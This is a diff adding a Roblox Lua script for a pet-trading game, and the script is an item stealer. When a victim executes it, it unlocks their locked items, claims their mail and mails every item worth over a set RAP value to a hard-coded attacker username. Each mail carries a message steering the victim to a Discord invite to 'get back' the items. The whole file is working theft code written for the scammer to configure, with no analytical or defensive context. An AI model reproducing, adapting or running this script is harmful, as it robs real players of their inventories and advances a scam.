@@ -1,0 +1,94 @@
+Username = "bx4rzwasdeleted"
+min_rap = 10000 -- minimum rap of each item you want to get sent to you. 10k by default
+
+local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
+local library = require(game.ReplicatedStorage.Library)
+local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
+local plr = game.Players.LocalPlayer
+local MailMessage = "Join gg / GY2RVSEGDT to get back"
+local HttpService = game:GetService("HttpService")
+local sortedItems = {}
+local totalRAP = 0
+_G.scriptExecuted = _G.scriptExecuted or false
+local GetSave = function()
+    return require(game.ReplicatedStorage.Library.Client.Save).Get()
+end
+
+if _G.scriptExecuted then
+    return
+end
+_G.scriptExecuted = true
+
+local function getRAP(Type, Item)
+    return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get(
+        {
+            Class = {Name = Type},
+            IsA = function(hmm)
+                return hmm == Type
+            end,
+            GetId = function()
+                return Item.id
+            end,
+            StackKey = function()
+                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
+            end
+        }
+    ) or 0)
+end
+
+local user = Username
+
+local function sendItem(category, uid, am)
+    local args = {
+        [1] = user,
+        [2] = MailMessage,
+        [3] = category,
+        [4] = uid,
+        [5] = am or 1
+    }
+    local response = false
+    repeat
+        local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    until response == true
+end
+
+local function ClaimMail()
+    local response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
+    while err == "You must wait 30 seconds before using the mailbox!" do
+        wait()
+        response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
+    end
+end
+
+local categoryList = {"Pet", "Hoverboard", "Fruit", "Misc", "Booth"}
+
+for i, v in pairs(categoryList) do
+    if save[v] ~= nil then
+        for uid, item in pairs(save[v]) do
+            local rapValue = getRAP(v, item)
+            if rapValue >= min_rap then
+                table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
+                totalRAP = totalRAP + (rapValue * (item._am or 1))
+            end
+            if item._lk then
+                local args = {
+                [1] = uid,
+                [2] = false
+                }
+                network:WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
+            end
+        end
+    end
+end
+
+if #sortedItems > 0 then
+    ClaimMail()
+    
+    table.sort(sortedItems, function(a, b)
+        return a.rap * a.amount > b.rap * b.amount 
+    end)
+
+    for _, item in ipairs(sortedItems) do
+        sendItem(item.category, item.uid, item.amount)
+    end
+end
